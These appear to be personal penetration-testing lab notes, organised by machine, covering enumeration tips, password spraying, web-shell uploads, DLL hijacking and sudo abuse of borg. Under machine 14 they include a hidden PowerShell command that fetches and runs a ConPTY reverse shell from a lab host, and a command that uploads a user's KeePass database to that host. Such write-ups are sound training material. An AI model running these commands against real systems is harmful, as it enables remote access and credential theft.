-  Directory traversal SSH keys can be in following locations
```bash
id_rsa 
id_ecdsa 
id_ecdsa_sk 
id_ed25519 
id_ed25519_sk 
id_dsa
```

#### 247
- Learned to how to do nmap scans and with a full nmap scan FTP port was there with a PDF
```bash
ftp anonymous:192.168.201.247 14020
```

- Always check for all ports and low hanging fruits SMB, FTP
- If you find creds/keys check everything against same port.

### 246

- There was  a php file called test.php that had a shell 
- User WWW had root permissions

### 248

- If its too easy it can be a rabbit hole, beta dll was a rabbit hole
- it was a password in path variable 
- If there is a new password and no user spray it

### 249

- If one reverseshell terminates try another.
- Always remember the OS
- Used default creds on the CMS, uploaded a shell with .pHp extension and executed ConPTY
- Powershell history had a password

### 14

- After phishing for jim, got access for this machine.
- Encoded Conpty did not work for this machine but below worked in LNK file
```powershell
powershell.exe  -WindowStyle hidden -c "IEX(IWR http://192.168.45.221:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.221 443"
```
- There was Keepass in downloads which is a hint that user has something in his keepas file 
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.221/upload.php','C:\Users\jim\Documents\Database.kdbx')
```

### 7

- initial Access was granted by a CME spray
- Scheduler Service DLL hijacking was for privilege escalation.


### 191

- dmzadmin was a local user and needed to emit the domain while RDP

### 19

- Found the key from 7 and SSHed it and found borg sudo commands are allowed
- Since its backup related ran below command
```bash
find / -name *backup* 2>/dev/null
```

Then played with borg to extract the data

```bash
sudo /usr/bin/borg list /opt/borgbackup::home
sudo /usr/bin/borg extract /opt/borgbackup::home --stdout ##worked
sudo /usr/bin/borg mount /opt/borgbackup::home /tmp/mount
```

### 20

#### FREEBSD facts
- sudo is doas sometimes might have to give full path to doas binary 
